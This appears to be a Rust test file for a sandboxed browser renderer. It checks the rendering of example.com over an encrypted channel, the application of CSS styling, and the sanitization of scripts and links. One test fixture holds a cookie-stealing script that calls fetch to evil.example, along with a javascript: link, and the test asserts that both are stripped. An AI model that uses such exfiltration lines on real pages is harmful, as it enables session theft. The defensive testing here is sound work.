//! End-to-end proof that example.com renders *fully* inside a zero-knowledge tab.
//!
//! These tests drive the real components — the AES-256-GCM encrypted [`Channel`]
//! and the isolated [`ZkVmRenderer`] task — exactly as the browser does. Untrusted
//! HTML bytes go in across the boundary; only a sanitized, positioned display list
//! comes back. We assert the complete page (heading, body paragraph, and the
//! "More information..." link) is present and laid out.

use citadel_tabs::zkvm_renderer::spawn_zkvm_renderer;
use citadel_tabs::{render_in_isolation, DisplayKind, RenderRequest, RenderedContent};
use citadel_zkvm::{Channel, ChannelMessage};
use std::time::Duration;

/// The canonical example.com document (verbatim structure of the live page).
const EXAMPLE_COM_HTML: &str = r#"<!doctype html>
<html>
<head>
    <title>Example Domain</title>
    <meta charset="utf-8" />
    <meta http-equiv="Content-type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <style type="text/css">
    body { background-color: #f0f0f2; font-family: -apple-system, sans-serif; }
    div { width: 600px; margin: 5em auto; padding: 2em; }
    a:link, a:visited { color: #38488f; text-decoration: none; }
    </style>
</head>
<body>
<div>
    <h1>Example Domain</h1>
    <p>This domain is for use in illustrative examples in documents. You may use this
    domain in literature without prior coordination or asking for permission.</p>
    <p><a href="https://www.iana.org/domains/example">More information...</a></p>
</div>
</body>
</html>"#;

/// Assert that a rendered display list contains the complete example.com page.
fn assert_example_com_fully_rendered(rendered: &RenderedContent) {
    // Title was extracted inside the boundary.
    assert_eq!(rendered.title, "Example Domain", "document title");

    let items = &rendered.display_list;
    assert!(!items.is_empty(), "display list must not be empty");

    // The heading.
    let heading = items
        .iter()
        .find(|i| i.kind == DisplayKind::Heading)
        .expect("a heading run must be present");
    assert_eq!(heading.text, "Example Domain", "heading text");
    assert!(heading.font_size >= 24.0, "heading should be large");
    assert!(heading.bold, "heading should be bold");

    // The body paragraph (whitespace collapsed across the source line break).
    let paragraph = items
        .iter()
        .find(|i| i.kind == DisplayKind::Paragraph && i.text.contains("illustrative examples"))
        .expect("body paragraph must be present");
    assert!(
        paragraph
            .text
            .contains("without prior coordination or asking for permission"),
        "paragraph must contain the full sentence, got: {:?}",
        paragraph.text
    );

    // The link, with a sanitized (preserved, https) href.
    let link = items
        .iter()
        .find(|i| i.kind == DisplayKind::Link)
        .expect("the 'More information...' link must be present");
    assert!(
        link.text.contains("More information"),
        "link text: {:?}",
        link.text
    );
    assert_eq!(
        link.href.as_deref(),
        Some("https://www.iana.org/domains/example"),
        "link href must be preserved"
    );

    // The <style> block must have been pruned at the boundary: no CSS leaked
    // into any visible run.
    for item in items {
        assert!(
            !item.text.contains("font-family") && !item.text.contains("background-color"),
            "CSS leaked into rendered content: {:?}",
            item.text
        );
    }
    assert!(
        rendered.security_metadata.blocked_elements >= 1,
        "boundary should report pruning the non-visual <style>/<meta>/<head>"
    );

    // Block-flow layout: every run is positioned, sized, and stacked top-to-bottom.
    for item in items {
        assert!(
            item.width > 0.0 && item.height > 0.0,
            "every run must have a box: {:?}",
            item.text
        );
    }
    assert!(heading.y < paragraph.y, "heading above paragraph");
    assert!(paragraph.y < link.y, "paragraph above link");
    assert!(
        rendered.height > heading.height,
        "total height must span the page"
    );
}

/// Pure-function render: parse + sanitize + layout inside the boundary helper.
#[test]
fn example_com_renders_fully_pure() {
    let request = RenderRequest {
        url: "https://example.com/".to_string(),
        html: EXAMPLE_COM_HTML.to_string(),
        viewport_width: 800.0,
    };
    let rendered = render_in_isolation(&request);
    assert_example_com_fully_rendered(&rendered);
}

/// THE GOAL: example.com rendered fully across the real encrypted ZKVM channel,
/// by an isolated renderer task — i.e. inside a zero-knowledge tab.
#[tokio::test]
async fn example_com_renders_fully_over_encrypted_channel() {
    // A real AES-256-GCM encrypted channel pair: host end and VM end.
    let (mut host_side, vm_side) = Channel::new().expect("create encrypted channel");

    // The isolated renderer owns the VM end and shares nothing else with the host.
    let renderer = tokio::spawn(async move {
        let _ = spawn_zkvm_renderer(vm_side).await;
    });

    // Host sends ONLY the raw untrusted bytes across the boundary.
    let request = RenderRequest {
        url: "https://example.com/".to_string(),
        html: EXAMPLE_COM_HTML.to_string(),
        viewport_width: 800.0,
    };
    host_side
        .send(ChannelMessage::Control {
            command: "render_page".to_string(),
            params: serde_json::to_string(&request).expect("serialize request"),
        })
        .await
        .expect("send render_page across boundary");

    // Host receives ONLY the sanitized display list back.
    let message = tokio::time::timeout(Duration::from_secs(10), host_side.receive())
        .await
        .expect("renderer responded before timeout")
        .expect("receive rendered content");

    let rendered: RenderedContent = match message {
        ChannelMessage::Control { command, params } => {
            assert_eq!(
                command, "rendered_content",
                "expected rendered_content reply"
            );
            serde_json::from_str(&params).expect("deserialize rendered content")
        }
        other => panic!("unexpected reply from boundary: {:?}", other),
    };

    assert_example_com_fully_rendered(&rendered);
    renderer.abort();
}

/// The boundary must fail closed: scripts are pruned and dangerous URL schemes
/// are stripped before anything reaches the host.
#[test]
fn boundary_blocks_scripts_and_dangerous_urls() {
    let malicious = r#"<!doctype html><html><head><title>Bad</title></head><body>
        <h1>Safe Heading</h1>
        <script>fetch('https://evil.example/steal?c='+document.cookie)</script>
        <p>Visible text.</p>
        <p><a href="javascript:steal()">click me</a></p>
        <p><a href="https://ok.example/page">good link</a></p>
        </body></html>"#;

    let rendered = render_in_isolation(&RenderRequest {
        url: "https://victim.example/".to_string(),
        html: malicious.to_string(),
        viewport_width: 800.0,
    });

    // No script source survived into any visible run.
    for item in &rendered.display_list {
        assert!(
            !item.text.contains("document.cookie"),
            "script body leaked: {:?}",
            item.text
        );
        assert!(
            !item.text.contains("fetch("),
            "script body leaked: {:?}",
            item.text
        );
    }

    // The javascript: link kept its text but lost its dangerous href.
    let js_link = rendered
        .display_list
        .iter()
        .find(|i| i.kind == DisplayKind::Link && i.text.contains("click me"))
        .expect("link text preserved");
    assert_eq!(js_link.href, None, "javascript: scheme must be stripped");

    // The benign https link is preserved intact.
    let good_link = rendered
        .display_list
        .iter()
        .find(|i| i.text.contains("good link"))
        .expect("good link present");
    assert_eq!(good_link.href.as_deref(), Some("https://ok.example/page"));

    // The visible heading and paragraph still rendered.
    assert!(rendered
        .display_list
        .iter()
        .any(|i| i.text == "Safe Heading"));
    assert!(rendered
        .display_list
        .iter()
        .any(|i| i.text == "Visible text."));
    assert!(
        rendered.security_metadata.blocked_elements >= 2,
        "script + js-url blocked"
    );
}

/// Stage B1: the CSS cascade inside the boundary drives page background, centered
/// content width, and per-element colours/sizes — not just tag defaults.
#[test]
fn css_cascade_drives_colors_background_and_width() {
    let html = r#"<!doctype html><html><head><title>Styled</title>
        <style>
        body { background-color: #eeeeee; width: 60vw; }
        h1 { color: #ff0000; }
        p { color: #222244; font-size: 18px; }
        a { color: #38488f; }
        </style></head><body>
        <h1>Heading</h1>
        <p>Body text.</p>
        <p><a href="https://ok.example/">link</a></p>
        </body></html>"#;

    let r = render_in_isolation(&RenderRequest {
        url: "https://styled.example/".to_string(),
        html: html.to_string(),
        viewport_width: 1000.0,
    });

    // Page background from `body { background-color: #eeeeee }`.
    assert_eq!(r.background, [0xee, 0xee, 0xee], "page background from CSS");
    // Centered content width from `body { width: 60vw }` = 600 of 1000.
    assert!(
        (r.content_width - 600.0).abs() < 1.0,
        "content_width should be 60vw=600, got {}",
        r.content_width
    );

    let heading = r
        .display_list
        .iter()
        .find(|i| i.kind == DisplayKind::Heading)
        .expect("heading present");
    assert_eq!(heading.color, [255, 0, 0], "h1 colour from CSS");

    let para = r
        .display_list
        .iter()
        .find(|i| i.kind == DisplayKind::Paragraph && i.text.contains("Body text"))
        .expect("paragraph present");
    assert_eq!(para.color, [0x22, 0x22, 0x44], "p colour from CSS");
    assert!((para.font_size - 18.0).abs() < 0.1, "p font-size from CSS, got {}", para.font_size);

    let link = r
        .display_list
        .iter()
        .find(|i| i.kind == DisplayKind::Link)
        .expect("link present");
    assert_eq!(link.color, [0x38, 0x48, 0x8f], "a colour from CSS");
}

/// Stage B2: CSS box decoration (background / border / padding / margin) on a
/// text-bearing block is carried on its display item.
#[test]
fn css_box_styling_is_applied_to_block() {
    let html = r#"<!doctype html><html><head><style>
        p.card {
            background-color: #ffeecc;
            border-width: 2px;
            border-color: #884400;
            padding: 12px;
            margin-top: 20px;
        }
        </style></head><body>
        <p class="card">Boxed paragraph</p>
        </body></html>"#;

    let r = render_in_isolation(&RenderRequest {
        url: "https://boxes.example/".to_string(),
        html: html.to_string(),
        viewport_width: 1000.0,
    });

    let card = r
        .display_list
        .iter()
        .find(|i| i.text.contains("Boxed paragraph"))
        .expect("boxed paragraph present");

    assert_eq!(card.background, Some([0xff, 0xee, 0xcc]), "block background from CSS");
    assert_eq!(card.border_color, Some([0x88, 0x44, 0x00]), "block border colour from CSS");
    assert!((card.border_width - 2.0).abs() < 0.5, "border width ~2px, got {}", card.border_width);
    assert!((card.padding - 12.0).abs() < 0.5, "padding ~12px, got {}", card.padding);
    assert!((card.margin_top - 20.0).abs() < 0.5, "margin-top ~20px, got {}", card.margin_top);
}
